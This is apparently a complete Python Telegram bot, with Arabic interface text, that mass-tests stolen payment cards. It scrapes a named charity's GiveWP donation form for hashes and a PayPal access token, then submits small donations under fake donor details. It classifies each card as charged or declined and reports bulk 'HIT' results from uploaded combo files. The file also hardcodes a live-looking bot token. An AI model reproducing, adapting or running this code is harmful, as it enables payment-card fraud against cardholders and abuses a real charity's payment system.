import requests, json, re, random, sys, os, time, base64, html
import urllib3
import asyncio
from requests_toolbelt import MultipartEncoder
from telegram import Update
from telegram.ext import ApplicationBuilder, CommandHandler, MessageHandler, filters, ContextTypes

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

# إعدادات البوت
TOKEN = '7803099267:AAFonfKn2Zbo0ENoSyzsk7Jp45KVM6uChfk'
ADMIN_ID = 7533168895

SITE_URL = 'https://alhijrahtrust.org/donations/old-phase-2-archive/'
BASE_URL = 'https://alhijrahtrust.org'
IFRAME_URL = SITE_URL
UA = 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/137.0.0.0 Mobile Safari/537.36'

# متغيرات الحالة للتحكم في العمليات
is_running = False
stop_requested = False
check_amount = "1.00" # القيمة الافتراضية

def extract_data():
    s = requests.Session()
    s.verify = False
    headers = {'User-Agent': UA, 'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8'}
    try:
        r = s.get(IFRAME_URL, headers=headers, timeout=20)
        html_content = r.text
        if 'givewp-route=donation-form-view' in html_content and 'givewp-route-signature' not in html_content:
            fid = re.search(r'form-id[=]+(\d+)', html_content)
            if fid:
                iframe = f'{BASE_URL}/?givewp-route=donation-form-view&form-id={fid.group(1)}'
                r2 = s.get(iframe, headers=headers, timeout=20)
                html_content = r2.text
        fp = re.search(r'name="give-form-id-prefix" value="(.*?)"', html_content)
        fi = re.search(r'name="give-form-id" value="(.*?)"', html_content)
        nc = re.search(r'name="give-form-hash" value="(.*?)"', html_content)
        if not all([fp, fi, nc]):
            return None
        enc = re.search(r'"data-client-token":"(.*?)"', html_content)
        if not enc:
            return None
        dec = base64.b64decode(enc.group(1)).decode('utf-8')
        au = re.search(r'"accessToken":"(.*?)"', dec)
        if not au:
            return None
        return {
            'fp': fp.group(1), 'fi': fi.group(1), 'nc': nc.group(1),
            'at': au.group(1), 'session': s
        }
    except Exception as e:
        print(f"Error in extract_data: {e}")
        return None

def check_card(ccx, amount):
    try:
        ccx = ccx.strip()
        parts = ccx.split('|')
        if len(parts) < 4: return 'INVALID_FORMAT'
        cc, mm, yy, cvv = parts[0], parts[1], parts[2], parts[3]
        if len(yy) == 2: yy = '20' + yy
        email = f'drgam{random.randint(100,999)}@gmail.com'
        d = extract_data()
        if not d: return 'EXTRACT_FAILED | Could not get form data from site'
        s = d['session']
        fp, fi, nc, at = d['fp'], d['fi'], d['nc'], d['at']
        headers = {
            'origin': BASE_URL, 'referer': SITE_URL,
            'sec-ch-ua': '"Chromium";v="137", "Not/A)Brand";v="24"',
            'sec-ch-ua-mobile': '?1', 'sec-ch-ua-platform': '"Android"',
            'sec-fetch-dest': 'empty', 'sec-fetch-mode': 'cors',
            'sec-fetch-site': 'same-origin',
            'user-agent': UA, 'x-requested-with': 'XMLHttpRequest',
        }
        data = {
            'give-honeypot': '', 'give-form-id-prefix': fp, 'give-form-id': fi,
            'give-form-title': '', 'give-current-url': SITE_URL,
            'give-form-url': SITE_URL, 'give-form-minimum': '1.00',
            'give-form-maximum': '999999.99', 'give-form-hash': nc,
            'give-price-id': '3', 'give-recurring-logged-in-only': '',
            'give-logged-in-only': '1', '_give_is_donation_recurring': '0',
            'give_recurring_donation_details': '{"give_recurring_option":"yes_donor"}',
            'give-amount': amount, 'give_stripe_payment_method': '',
            'payment-mode': 'paypal-commerce', 'give_first': 'DRGAM',
            'give_last': 'rights and', 'give_email': email,
            'card_name': 'drgam', 'card_exp_month': '', 'card_exp_year': '',
            'give_action': 'purchase', 'give-gateway': 'paypal-commerce',
            'action': 'give_process_donation', 'give_ajax': 'true',
        }
        
        s.post(f'{BASE_URL}/wp-admin/admin-ajax.php', headers=headers, data=data, timeout=20)
        mp = MultipartEncoder(fields={
            'give-honeypot': (None, ''), 'give-form-id-prefix': (None, fp),
            'give-form-id': (None, fi), 'give-form-title': (None, ''),
            'give-current-url': (None, SITE_URL), 'give-form-url': (None, SITE_URL),
            'give-form-minimum': (None, '1.00'), 'give-form-maximum': (None, '999999.99'),
            'give-form-hash': (None, nc), 'give-price-id': (None, '3'),
            'give-recurring-logged-in-only': (None, ''), 'give-logged-in-only': (None, '1'),
            '_give_is_donation_recurring': (None, '0'),
            'give_recurring_donation_details': (None, '{"give_recurring_option":"yes_donor"}'),
            'give-amount': amount, 'give_stripe_payment_method': (None, ''),
            'payment-mode': (None, 'paypal-commerce'), 'give_first': (None, 'DRGAM'),
            'give_last': (None, 'rights and'), 'give_email': (None, email),
            'card_name': (None, 'drgam'), 'card_exp_month': (None, ''),
            'card_exp_year': (None, ''), 'give-gateway': (None, 'paypal-commerce'),
        })
        headers['content-type'] = mp.content_type
        r1 = s.post(f'{BASE_URL}/wp-admin/admin-ajax.php?action=give_paypal_commerce_create_order', headers=headers, data=mp, timeout=20)
        tok = r1.json()['data']['id']
        
        pp_headers = {
            'authority': 'cors.api.paypal.com', 'accept': '*/*',
            'authorization': f'Bearer {at}',
            'braintree-sdk-version': '3.32.0-payments-sdk-dev',
            'content-type': 'application/json',
            'origin': 'https://assets.braintreegateway.com',
            'referer': 'https://assets.braintreegateway.com/',
            'paypal-client-metadata-id': '7d9928a1f3f1fbc240cfd71a3eefe835',
            'user-agent': UA,
        }
        json_data = {
            'payment_source': {'card': {'number': cc, 'expiry': f'{yy}-{mm}', 'security_code': cvv,
                'attributes': {'verification': {'method': 'SCA_WHEN_REQUIRED'}}}},
            'application_context': {'vault': False},
        }
        s.post(f'https://cors.api.paypal.com/v2/checkout/orders/{tok}/confirm-payment-source', headers=pp_headers, json=json_data, timeout=20)
        
        mp2 = MultipartEncoder(fields={
            'give-honeypot': (None, ''), 'give-form-id-prefix': (None, fp),
            'give-form-id': (None, fi), 'give-form-title': (None, ''),
            'give-current-url': (None, SITE_URL), 'give-form-url': (None, SITE_URL),
            'give-form-minimum': (None, '1.00'), 'give-form-maximum': (None, '999999.99'),
            'give-form-hash': (None, nc), 'give-price-id': (None, '3'),
            'give-recurring-logged-in-only': (None, ''), 'give-logged-in-only': (None, '1'),
            '_give_is_donation_recurring': (None, '0'),
            'give_recurring_donation_details': (None, '{"give_recurring_option":"yes_donor"}'),
            'give-amount': amount, 'give_stripe_payment_method': (None, ''),
            'payment-mode': (None, 'paypal-commerce'), 'give_first': (None, 'DRGAM'),
            'give_last': (None, 'rights and'), 'give_email': (None, email),
            'card_name': (None, 'drgam'), 'card_exp_month': (None, ''),
            'card_exp_year': (None, ''), 'give-gateway': (None, 'paypal-commerce'),
        })
        headers['content-type'] = mp2.content_type
        r2 = s.post(f'{BASE_URL}/wp-admin/admin-ajax.php?action=give_paypal_commerce_approve_order&order=' + tok, headers=headers, data=mp2, timeout=20)
        txt = r2.text
        
        if 'DO_NOT_HONOR' in txt: return 'Declined | Do not honor'
        elif 'ACCOUNT_CLOSED' in txt: return 'Declined | Account closed'
        elif 'PAYER_ACCOUNT_LOCKED_OR_CLOSED' in txt: return 'Declined | Account closed'
        elif 'LOST_OR_STOLEN' in txt: return 'Declined | LOST OR STOLEN'
        elif 'CVV2_FAILURE' in txt: return 'Declined | Card Issuer Declined CVV'
        elif 'SUSPECTED_FRAUD' in txt: return 'Declined | SUSPECTED FRAUD'
        elif 'INVALID_ACCOUNT' in txt: return 'Declined | INVALID_ACCOUNT'
        elif 'REATTEMPT_NOT_PERMITTED' in txt: return 'Declined | REATTEMPT NOT PERMITTED'
        elif 'ACCOUNT BLOCKED BY ISSUER' in txt: return 'Declined | ACCOUNT_BLOCKED_BY_ISSUER'
        elif 'ORDER_NOT_APPROVED' in txt: return 'Declined | ORDER_NOT_APPROVED'
        elif 'PICKUP_CARD_SPECIAL_CONDITIONS' in txt: return 'Declined | PICKUP_CARD_SPECIAL_CONDITIONS'
        elif 'PAYER_CANNOT_PAY' in txt: return 'Declined | PAYER CANNOT PAY'
        elif 'INSUFFICIENT_FUNDS' in txt: return 'Declined | Insufficient Funds'
        elif 'GENERIC_DECLINE' in txt: return 'Declined | GENERIC_DECLINE'
        elif 'COMPLIANCE_VIOLATION' in txt: return 'Declined | COMPLIANCE VIOLATION'
        elif 'TRANSACTION_NOT PERMITTED' in txt: return 'Declined | TRANSACTION NOT PERMITTED'
        elif 'PAYMENT_DENIED' in txt: return 'Declined | PAYMENT_DENIED'
        elif 'INVALID_TRANSACTION' in txt: return 'Declined | INVALID TRANSACTION'
        elif 'RESTRICTED_OR_INACTIVE_ACCOUNT' in txt: return 'Declined | RESTRICTED OR INACTIVE ACCOUNT'
        elif 'SECURITY_VIOLATION' in txt: return 'Declined | SECURITY_VIOLATION'
        elif 'DECLINED_DUE_TO_UPDATED_ACCOUNT' in txt: return 'Declined | DECLINED DUE TO UPDATED ACCOUNT'
        elif 'INVALID_OR_RESTRICTED_CARD' in txt: return 'Declined | INVALID CARD'
        elif 'EXPIRED_CARD' in txt: return 'Declined | EXPIRED CARD'
        elif 'CRYPTOGRAPHIC_FAILURE' in txt: return 'Declined | CRYPTOGRAPHIC FAILURE'
        elif 'TRANSACTION_CANNOT_BE_COMPLETED' in txt: return 'Declined | TRANSACTION CANNOT BE COMPLETED'
        elif 'DECLINED_PLEASE_RETRY' in txt: return 'Declined | DECLINED PLEASE RETRY LATER'
        elif 'TX_ATTEMPTS_EXCEED_LIMIT' in txt: return 'Declined | EXCEED LIMIT'
        elif 'true' in txt or 'sucsess' in txt: return 'Charged !'
        else:
            try:
                return f"Response | {json.loads(txt)['data']['error']}"
            except:
                return f'Response | {txt[:100]}'
    except Exception as e:
        return f"Error: {str(e)}"

async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if update.effective_user.id != ADMIN_ID:
        await update.message.reply_text("عذراً، هذا البوت خاص فقط.")
        return
    welcome_text = (
        "👋 <b>أهلاً بك في بوت فحص البطاقات الاحترافي!</b>\n\n"
        "🚀 <b>طريقة الاستخدام:</b>\n"
        "• أرسل البطاقة بصيغة: <code>cc|mm|yy|cvv</code> للفحص الفردي.\n"
        "• أرسل ملف نصي (Combo) للفحص الجماعي.\n\n"
        "🛠 <b>الأوامر المتاحة:</b>\n"
        "• /start - بدء تشغيل البوت.\n"
        "• /amount [القيمة] - تحديد مبلغ الفحص (مثلاً: <code>/amount 0.4</code>).\n"
        "• /stop - إيقاف عملية الفحص الجارية.\n\n"
        "✨ <b>البوت يعمل الآن ومستعد لخدمتك!</b>"
    )
    await update.message.reply_text(welcome_text, parse_mode='HTML')

async def set_amount(update: Update, context: ContextTypes.DEFAULT_TYPE):
    global check_amount
    if update.effective_user.id != ADMIN_ID: return
    
    if not context.args:
        await update.message.reply_text(f"⚠️ <b>يرجى تحديد القيمة!</b>\nالمبلغ الحالي: <code>{check_amount}</code>", parse_mode='HTML')
        return
    
    new_amount = context.args[0]
    try:
        float(new_amount) # التحقق من أنها رقم
        check_amount = new_amount
        await update.message.reply_text(f"✅ <b>تم تغيير مبلغ الفحص إلى:</b> <code>{check_amount}</code>", parse_mode='HTML')
    except ValueError:
        await update.message.reply_text("❌ <b>يرجى إدخال رقم صحيح!</b>", parse_mode='HTML')

async def stop_process(update: Update, context: ContextTypes.DEFAULT_TYPE):
    global stop_requested, is_running
    if update.effective_user.id != ADMIN_ID: return
    
    if is_running:
        stop_requested = True
        await update.message.reply_text("🛑 <b>جاري إيقاف العملية فوراً...</b>", parse_mode='HTML')
    else:
        is_running = False
        stop_requested = False
        await update.message.reply_text("✅ <b>تم إعادة تعيين حالة البوت. يمكنك البدء الآن.</b>", parse_mode='HTML')

async def handle_message(update: Update, context: ContextTypes.DEFAULT_TYPE):
    global is_running, stop_requested, check_amount
    if update.effective_user.id != ADMIN_ID: return
    
    text = update.message.text
    if '|' in text:
        if is_running:
            await update.message.reply_text("⚠️ <b>هناك عملية فحص جارية بالفعل!</b>\nيرجى الانتظار أو استخدام /stop.", parse_mode='HTML')
            return
            
        is_running = True
        stop_requested = False
        try:
            msg = await update.message.reply_text(f"🔍 <b>جاري فحص البطاقة بمبلغ {check_amount}...</b>", parse_mode='HTML')
            result = await asyncio.to_thread(check_card, text, check_amount)
            
            status_icon = "✅" if "charged" in result.lower() else "❌"
            safe_text = html.escape(text)
            safe_result = html.escape(result)
            safe_username = html.escape(update.effective_user.username or 'Admin')
            
            response_text = (
                f"💳 <b>نتيجة فحص البطاقة:</b>\n\n"
                f"📝 <b>البطاقة:</b> <code>{safe_text}</code>\n"
                f"{status_icon} <b>النتيجة:</b> <code>{safe_result}</code>\n"
                f"💰 <b>المبلغ:</b> <code>{check_amount}</code>\n\n"
                f"👤 <b>بواسطة:</b> @{safe_username}"
            )
            await msg.edit_text(response_text, parse_mode='HTML')
        except Exception as e:
            await update.message.reply_text(f"❌ <b>حدث خطأ:</b> <code>{html.escape(str(e))}</code>", parse_mode='HTML')
        finally:
            is_running = False
    else:
        await update.message.reply_text("⚠️ <b>يرجى إرسال البطاقة بالصيغة الصحيحة:</b> <code>cc|mm|yy|cvv</code>", parse_mode='HTML')

async def handle_document(update: Update, context: ContextTypes.DEFAULT_TYPE):
    global is_running, stop_requested, check_amount
    if update.effective_user.id != ADMIN_ID: return
    
    if is_running:
        await update.message.reply_text("⚠️ <b>هناك عملية فحص جارية بالفعل!</b>\nيرجى الانتظار أو استخدام /stop.", parse_mode='HTML')
        return
        
    doc = update.message.document
    file = await context.bot.get_file(doc.file_id)
    file_path = f"temp_{doc.file_name}"
    await file.download_to_drive(file_path)
    
    is_running = True
    stop_requested = False
    
    try:
        safe_doc_name = html.escape(doc.file_name)
        status_msg = await update.message.reply_text(f"📂 <b>تم استلام الملف:</b> <code>{safe_doc_name}</code>\n⏳ <b>جاري بدء الفحص بمبلغ {check_amount}...</b>", parse_mode='HTML')
        
        with open(file_path, 'r') as f:
            cards = [l.strip() for l in f if '|' in l]
        
        total = len(cards)
        charged = 0
        declined = 0
        
        for i, card in enumerate(cards, 1):
            if stop_requested:
                await update.message.reply_text(f"🛑 <b>تم إيقاف العملية يدوياً!</b>\n📊 <b>تم فحص:</b> <code>{i-1}</code> من أصل <code>{total}</code>", parse_mode='HTML')
                break
                
            result = await asyncio.to_thread(check_card, card, check_amount)
            is_charged = 'charged' in result.lower()
            
            if is_charged:
                charged += 1
                safe_card = html.escape(card)
                safe_result = html.escape(result)
                hit_text = (
                    f"🔥 <b>تم الشحن بنجاح! (HIT)</b>\n\n"
                    f"💳 <b>البطاقة:</b> <code>{safe_card}</code>\n"
                    f"✅ <b>النتيجة:</b> <code>{safe_result}</code>\n"
                    f"💰 <b>المبلغ:</b> <code>{check_amount}</code>\n\n"
                    f"🚀 <b>استمر في العمل!</b>"
                )
                await update.message.reply_text(hit_text, parse_mode='HTML')
            else:
                declined += 1
            
            # تحديث رسالة الحالة في كل بطاقة لضمان عدم التعليق
            try:
                progress_bar = "▓" * int((i/total)*10) + "░" * (10 - int((i/total)*10))
                await status_msg.edit_text(
                    f"📊 <b>حالة الفحص الجاري:</b>\n"
                    f"━━━━━━━━━━━━━━\n"
                    f"✅ <b>مشحون:</b> <code>{charged}</code>\n"
                    f"❌ <b>مرفوض:</b> <code>{declined}</code>\n"
                    f"🔄 <b>متبقي:</b> <code>{total - i}</code>\n"
                    f"📈 <b>التقدم:</b> <code>{i}/{total}</code>\n"
                    f"💰 <b>المبلغ:</b> <code>{check_amount}</code>\n"
                    f"🎬 <b>البار:</b> <code>[{progress_bar}]</code>\n"
                    f"━━━━━━━━━━━━━━",
                    parse_mode='HTML'
                )
            except: pass
                
            await asyncio.sleep(0.2) # وقت انتظار قصير جداً لضمان السرعة والدقة
        
        if not stop_requested:
            final_text = (
                f"🏁 <b>انتهى الفحص بالكامل!</b>\n\n"
                f"📂 <b>الملف:</b> <code>{safe_doc_name}</code>\n"
                f"💎 <b>إجمالي البطاقات:</b> <code>{total}</code>\n"
                f"✅ <b>تم شحن:</b> <code>{charged}</code>\n"
                f"❌ <b>تم رفض:</b> <code>{declined}</code>\n"
                f"💰 <b>المبلغ المستخدم:</b> <code>{check_amount}</code>\n\n"
                f"✨ <b>شكراً لاستخدامك البوت!</b>"
            )
            await update.message.reply_text(final_text, parse_mode='HTML')
    except Exception as e:
        await update.message.reply_text(f"❌ <b>حدث خطأ غير متوقع:</b> <code>{html.escape(str(e))}</code>", parse_mode='HTML')
    finally:
        is_running = False
        stop_requested = False
        if os.path.exists(file_path):
            os.remove(file_path)

if __name__ == '__main__':
    app = ApplicationBuilder().token(TOKEN).build()
    app.add_handler(CommandHandler("start", start))
    app.add_handler(CommandHandler("amount", set_amount))
    app.add_handler(CommandHandler("stop", stop_process))
    app.add_handler(MessageHandler(filters.TEXT & (~filters.COMMAND), handle_message))
    app.add_handler(MessageHandler(filters.Document.ALL, handle_document))
    print("Bot is running...")
    app.run_polling()
